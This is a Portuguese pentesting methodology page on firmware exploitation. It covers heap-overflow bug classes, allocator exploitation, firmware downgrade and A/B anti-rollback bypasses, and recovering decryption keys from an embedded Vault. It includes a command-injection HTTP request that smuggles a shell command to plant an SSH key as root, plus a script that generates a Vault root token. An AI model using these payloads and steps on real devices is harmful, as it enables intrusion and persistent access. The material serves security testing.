Para protocolos sensíveis ao timing, o replay de pacotes com um framework Python pode ser lento demais. Uma abordagem mais confiável é emular um dispositivo legítimo em hardware real (por exemplo, um **nRF52840**) com uma stack de nível comercial, para expor os **endpoints**, **atributos** e o timing de commissioning corretos.

### Classe de bugs de downloads fragmentados em daemons embarcados

Uma classe recorrente de bugs de firmware aparece em downloads fragmentados de **blobs/modelos/configurações**:<sup>[[8]](#references)</sup>

1. O **primeiro fragmento** (`offset == 0`) armazena `ctx->total_size` e aloca `malloc(total_size)`.
2. Os fragmentos seguintes validam apenas campos **locais ao pacote** controlados pelo atacante, como `packet_total_size >= offset + chunk_len`.
3. A cópia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sem verificar se o tamanho não excede o **tamanho alocado originalmente**.

Isso permite que um atacante envie:

- Um primeiro fragmento válido com um tamanho total declarado **pequeno**, forçando uma alocação pequena no heap.
- Um fragmento posterior com o **offset esperado**, mas um `chunk_len` maior.
- Um tamanho local ao pacote falsificado que passa pelas novas verificações, mas ainda causa overflow no buffer alocado originalmente.

Quando o caminho vulnerável depende da lógica de commissioning, a exploração precisa incluir **emulação suficiente do dispositivo** para levar o alvo ao estado esperado de download de modelo ou blob antes de enviar os fragmentos malformados.

### Gatilhos de `free()` acionados pelo protocolo

Em daemons embarcados, a maneira mais fácil de acionar a exploração de metadados do heap costuma não ser “esperar pela limpeza”, mas **forçar o próprio tratamento de erros do protocolo**:<sup>[[8]](#references)</sup>

- Envie fragmentos subsequentes malformados para levar a FSM a estados de **retry** ou **erro**.
- Ultrapasse o limite de retries para que o daemon **redefina o contexto** e libere o buffer corrompido.
- Use esse `free()` previsível para acionar primitivas do alocador antes que o processo falhe por motivos não relacionados.

Isso é especialmente útil contra alocadores do tipo **musl/uClibc/dlmalloc** em Linux embarcado, nos quais a corrupção de metadados de chunks pode transformar a lógica de unlink/unbin em uma primitiva de escrita. Um padrão estável é corromper um **campo size** para redirecionar a travessia do alocador a **fake chunks preparados dentro do buffer sobrescrito**, em vez de sobrescrever imediatamente ponteiros reais de bins e causar a falha do processo.

## Exploração de binários e Proof-of-Concept

Desenvolver um PoC para vulnerabilidades identificadas exige um entendimento profundo da arquitetura alvo e programação em linguagens de baixo nível. Proteções de runtime de binários são raras em sistemas embarcados, mas, quando presentes, podem ser necessárias técnicas como Return Oriented Programming (ROP).

### Observações sobre exploração de fastbin do uClibc (Linux embarcado)

- **Fastbins + consolidação:** o uClibc usa fastbins semelhantes aos do glibc. Uma alocação grande posterior pode acionar `__malloc_consolidate()`, então qualquer fake chunk precisa passar pelas verificações (tamanho válido, `fd = 0` e chunks ao redor considerados “em uso”).<sup>[[6]](#references)</sup>
- **Binários não-PIE com ASLR:** se o ASLR estiver habilitado, mas o binário principal for **não-PIE**, os endereços `.data/.bss` dentro do binário são estáveis. É possível direcionar uma região que já se pareça com um cabeçalho válido de chunk do heap para fazer uma alocação fastbin cair em uma **tabela de ponteiros de função**.
- **NUL que interrompe o parser:** quando o JSON é analisado, um `\x00` no payload pode interromper o parsing e manter os bytes controlados pelo atacante que vêm depois, para um stack pivot/cadeia ROP.
- **Shellcode via `/proc/self/mem`:** uma cadeia ROP que chama `open("/proc/self/mem")`, `lseek()` e `write()` pode inserir shellcode executável em um mapeamento conhecido e saltar até ele.

## Sistemas operacionais preparados para análise de firmware

Sistemas operacionais como [AttifyOS](https://github.com/adi0x90/attifyos) e [EmbedOS](https://github.com/scriptingxss/EmbedOS) fornecem ambientes pré-configurados para testes de segurança de firmware, equipados com as ferramentas necessárias.

## Sistemas operacionais preparados para analisar firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS é uma distribuição criada para ajudar na avaliação de segurança e no pentesting de dispositivos da Internet das Coisas (IoT). Ela economiza muito tempo ao fornecer um ambiente pré-configurado com todas as ferramentas necessárias.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): sistema operacional para testes de segurança embarcada, baseado no Ubuntu 18.04 e pré-carregado com ferramentas de teste de segurança de firmware.

## Ataques de downgrade de firmware e mecanismos de atualização inseguros

Mesmo quando um fabricante implementa verificações de assinatura criptográfica para imagens de firmware, a **proteção contra reversão de versão (downgrade)** costuma ser omitida. Quando o bootloader ou o loader de recuperação verifica apenas a assinatura com uma chave pública incorporada, sem comparar a *versão* (ou um contador monotônico) da imagem que está sendo gravada, um atacante pode instalar legitimamente um **firmware antigo e vulnerável que ainda tenha uma assinatura válida**, reintroduzindo assim vulnerabilidades já corrigidas.<sup>[[4]](#references)</sup>

Fluxo de ataque típico:

1. **Obtenha uma imagem antiga assinada**
   * Baixe-a do portal público de downloads do fabricante, de uma CDN ou do site de suporte.
   * Extraia-a de aplicativos móveis/de desktop associados (por exemplo, de `assets/firmware/` dentro de um APK Android).
   * Obtenha-a em repositórios de terceiros, como VirusTotal, arquivos da Internet, fóruns etc.
2. **Envie ou disponibilize a imagem ao dispositivo** por qualquer canal de atualização exposto:
   * Interface web, API do aplicativo móvel, USB, TFTP, MQTT etc.
   * Muitos dispositivos IoT de consumo expõem endpoints HTTP(S) *sem autenticação* que aceitam blobs de firmware codificados em Base64, decodificam-nos no servidor e iniciam a recuperação/atualização.
3. Após o downgrade, explore uma vulnerabilidade corrigida em uma versão mais recente (por exemplo, um filtro contra command injection adicionado posteriormente).
4. Opcionalmente, grave novamente a imagem mais recente ou desative as atualizações para evitar a detecção depois de obter persistência.

### Exemplo: Command Injection após downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

No firmware vulnerável (com downgrade), o parâmetro `md5` é concatenado diretamente a um comando shell sem sanitização, permitindo a injeção de comandos arbitrários (neste caso, habilitando o acesso root por chave SSH). Versões posteriores do firmware introduziram um filtro básico de caracteres, mas a ausência de proteção contra downgrade torna essa correção inútil.<sup>[[4]](#references)</sup>

### Extraindo firmware de aplicativos móveis

Muitos fornecedores incluem imagens completas de firmware em seus aplicativos móveis complementares para que o app possa atualizar o dispositivo via Bluetooth/Wi-Fi. Esses pacotes costumam ser armazenados sem criptografia no APK/APEX, em caminhos como `assets/fw/` ou `res/raw/`. Ferramentas como `apktool`, `ghidra` ou até mesmo o simples `unzip` permitem extrair imagens assinadas sem tocar no hardware físico.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Bypass de anti-rollback limitado ao updater em designs com slots A/B

Alguns fornecedores implementam um **ratchet** anti-downgrade, mas apenas na lógica do *updater* (por exemplo, uma rotina UDS via CAN, um comando de recuperação ou um agente OTA em userspace). Se o **bootloader** verificar posteriormente apenas a assinatura/CRC da imagem e confiar na tabela de partições ou nos metadados do slot, ainda será possível contornar a proteção contra rollback.<sup>[[7]](#references)</sup>

Design fraco típico:

- Os metadados do firmware contêm um descritor de versão e um **ratchet de segurança** / contador monotônico.
- O updater compara o ratchet da imagem com um valor armazenado em armazenamento persistente e rejeita imagens assinadas mais antigas.
- O bootloader **não** analisa esse ratchet e apenas verifica o cabeçalho, o CRC e a assinatura antes de inicializar o slot selecionado.
- A ativação do slot é armazenada separadamente em uma tabela de partições ou em um contador de geração por slot e **não é vinculada criptograficamente** ao digest exato do firmware validado.

Isso cria uma primitiva de **validar uma imagem / inicializar outra** em sistemas dual-slot. Se o atacante conseguir fazer o updater marcar o slot B como próximo alvo de inicialização usando uma imagem assinada atual e depois sobrescrever o slot B antes da reinicialização, o bootloader ainda poderá inicializar a imagem desatualizada, pois confia apenas nos metadados do slot já confirmados.

Padrão comum de abuso:

1. Envie um firmware **atual e assinado** para o slot passivo e execute a rotina normal de validação/troca para que o layout marque esse slot como o próximo ativo.
2. **Não reinicie ainda**. Reentre na rotina de preparação/apagamento do slot na mesma sessão.
3. Abuse de um estado de inicialização desatualizado ou de uma lógica obsoleta de seleção de slot para que o updater apague o **mesmo slot físico** que acabou de ser promovido.
4. Grave nesse slot um firmware **mais antigo, mas ainda assinado**.
5. Ignore a rotina de validação que aplica o ratchet e reinicie diretamente.
6. O bootloader seleciona o slot promovido, verifica apenas a assinatura/integridade e inicializa a imagem antiga.

O que procurar ao fazer reverse engineering de implementações de atualização A/B:

- Seleção de slot derivada de **sinalizadores de inicialização** que não são atualizados após uma troca bem-sucedida.
- Uma rotina do tipo `prepare_passive_slot()` que apaga um slot com base em estado desatualizado, em vez do **layout atualmente confirmado**.
- Uma função do tipo `part_write_layout()` que apenas incrementa um **contador de geração** / sinalizador ativo e não armazena o hash da imagem validada.
- Verificações do ratchet implementadas em código de userspace ou do updater, mas **não** na ROM / bootloader / etapas de secure boot.
- Rotinas de apagamento ou recuperação que deixam o slot marcado como inicializável mesmo depois que seu conteúdo foi removido e regravado.

### Lista de verificação para avaliar a lógica de atualização

* O transporte/autenticação do *endpoint de atualização* está protegido adequadamente (TLS + autenticação)?
* O dispositivo compara **números de versão** ou um **contador monotônico anti-rollback** antes de gravar o firmware?
* A imagem é verificada dentro de uma cadeia de secure boot (por exemplo, com assinaturas verificadas pelo código da ROM)?
* O **bootloader aplica o mesmo ratchet** que o updater, em vez de verificar apenas a assinatura/CRC?
* Os metadados de ativação do slot estão **vinculados ao digest/versão do firmware validado** ou o slot pode ser modificado após a promoção?
* Após uma troca de slot bem-sucedida, o dispositivo é forçado a reiniciar ou ainda é possível acessar outras rotinas de atualização/apagamento na mesma sessão?
* O código de userland realiza verificações adicionais de integridade (por exemplo, mapa de partições permitido, número do modelo)?
* Os fluxos de atualização *parcial* ou de *backup* reutilizam a mesma lógica de validação?

> 💡  Se algum dos itens acima estiver ausente, a plataforma provavelmente está vulnerável a ataques de rollback.

## Firmware vulnerável para praticar

Para praticar a descoberta de vulnerabilidades em firmware, use os seguintes projetos de firmware vulnerável como ponto de partida.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recuperação de chaves de descriptografia de firmware a partir do estado de KMS/Vault incorporado

Quando uma imagem de atualização combina pequenos metadados em texto simples com um grande blob de alta entropia, faça a triagem do contêiner antes de tentar qualquer força bruta:<sup>[[1]](#references)</sup>

- Extraia cabeçalhos, offsets e limites de linha com `hexdump`, `xxd`, `strings -tx`, `base64 -d` e `binwalk -E`.
- `Salted__` geralmente indica o formato `enc` do OpenSSL: os próximos 8 bytes são o salt e os bytes restantes são o texto cifrado.
- Um campo Base64 que decodifica exatamente para `256` bytes é um forte indício de que você está diante de um texto cifrado RSA-2048 que encapsula uma senha aleatória do firmware/chave de sessão.
- Material PGP separado no mesmo arquivo geralmente protege apenas a autenticidade; não presuma que seja o mecanismo de confidencialidade.

Se a busca por chaves estáticas (`grep`, `strings`, buscas por PEM/PGP) falhar, faça reverse engineering do **fluxo operacional de descriptografia** em vez de apenas procurar chaves privadas:

- Descompile o updater/binário de gerenciamento e rastreie quem lê o blob criptografado, qual helper/API o desembrulha e qual nome lógico de chave ele solicita.
- Pesquise no sistema de arquivos raiz extraído por estado de KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), além de arquivos de unidade e scripts de inicialização.
- Trate comandos em texto simples como `vault operator unseal ...`, chaves de recuperação, tokens de bootstrap ou scripts locais de auto-unseal do KMS como equivalentes a material de chave privada.

Se o appliance incluir o binário original do Vault e o backend de armazenamento, reproduzir esse ambiente costuma ser mais fácil do que reimplementar os componentes internos do Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Com root no KMS clonado:

- Torne as chaves transit exportáveis somente dentro do clone isolado: `vault write transit/keys/<name>/config exportable=true`
- Exporte a chave unwrap: `vault read transit/export/encryption-key/<name>`
- Experimente a chave RSA recuperada com o par exato de padding/hash usado pelo KMS. Uma falha na descriptografia PKCS#1 v1.5 e uma falha na descriptografia OAEP padrão **não** provam que a chave está errada; muitos fluxos baseados em Vault usam OAEP com SHA-256, enquanto bibliotecas comuns usam SHA-1 por padrão.
- Se o payload começar com `Salted__`, reproduza exatamente o KDF do OpenSSL usado pelo fornecedor (`EVP_BytesToKey`, geralmente MD5 em dispositivos legados) antes de tentar a descriptografia AES-CBC.

Isso transforma o problema de "firmware criptografado" em um problema mais geral: **recupere as chaves operacionais do lado do appliance e, em seguida, reproduza offline os parâmetros exatos de unwrap + KDF**.

## Treinamento e Certificações

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Quebrando o firmware com Claude: habilidade de nível sênior, autonomia de nível júnior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologia de teste de segurança de firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Hacking prático de IoT: o guia definitivo para atacar a Internet das Coisas](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Explorando zero-days em hardware abandonado – blog da Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Como um dispositivo inteligente de US$ 20 me deu acesso à sua casa](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Agora você me vê: agora você foi comprometido](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Explorando o Tesla Wall Connector pelo conector da porta de carregamento - Parte 2: contornando o anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Faça piscar: exploração over-the-air do Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS no QEMU Parte 1: desempacotamento](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Documentação do kernel Linux - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS no QEMU Parte 2: depuração e correção](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Senhas do BIOS da Dell: criptografia XOR fraca permite recuperação a partir do SPI Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Ferramentas de recuperação de senha do BIOS da Dell](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
